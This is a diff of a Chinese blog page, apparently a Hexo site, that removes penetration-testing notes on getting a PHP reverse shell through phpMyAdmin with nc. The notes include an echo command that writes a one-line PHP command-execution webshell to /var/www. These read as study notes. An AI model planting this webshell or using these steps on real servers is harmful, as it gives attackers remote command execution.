-<h4 id="3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell"><a href="#3-手动漏洞挖掘–PHP反弹Shell以及写入WebShell" class="headerlink" title="3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell"></a>3. 手动漏洞挖掘–PHP反弹Shell以及写入WebShell</h4><ul>
-<li>PHP反弹shell<ul>
-<li><strong><code>🔺命令：cp  /usr/share/webshells/php/php-reverse-shell.php ./3.php</code></strong></li>
-<li><strong><code>🔺命令：vi 3.php</code></strong></li>
-<li>修改反弹Shell的ip</li>
-<li>3.php的内容加在POST中的body部分</li>
-<li>nc 侦听端口</li>
-<li>发送POST信息到phpMyAdmin上</li>
-<li>获得Shell</li>
-</ul>
-</li>
-<li>File</li>
-<li>Whereis<ul>
-<li>ifconfig</li>
-</ul>
-</li>
-<li>写入WebShell<ul>
-<li><strong><code>🔺命令：echo &quot;&lt;?php \$cmd=\$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt; /var/www/2.php</code></strong>（\用于避免$后面的变量过滤）</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3059,7 +3404,7 @@ Host：123
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-count">75</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
